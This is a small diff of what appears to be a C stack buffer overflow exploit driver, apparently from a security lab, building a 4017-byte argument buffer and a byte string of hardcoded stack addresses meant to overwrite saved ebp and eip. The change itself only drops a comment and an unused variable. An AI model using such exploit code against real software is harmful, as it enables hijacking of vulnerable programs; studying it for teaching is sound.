@@ -16,10 +16,9 @@ int main() {
     FILE *fp;
 	char *args[4];
 	char *env[1];
-    unsigned char argbuf[4017]; // 1024 for buffer, 4 for ebp, 4 for eip
+    unsigned char argbuf[4017]; 
     unsigned char mod[] = "\xa8\x0f\x00\x00\xa4\x0f\x00\x00\x98\xde\xbf\xff\xa4\xd0\xbf\xff";
 
-    size_t i, len;
     char *ptr;
 
     // create the argbuf
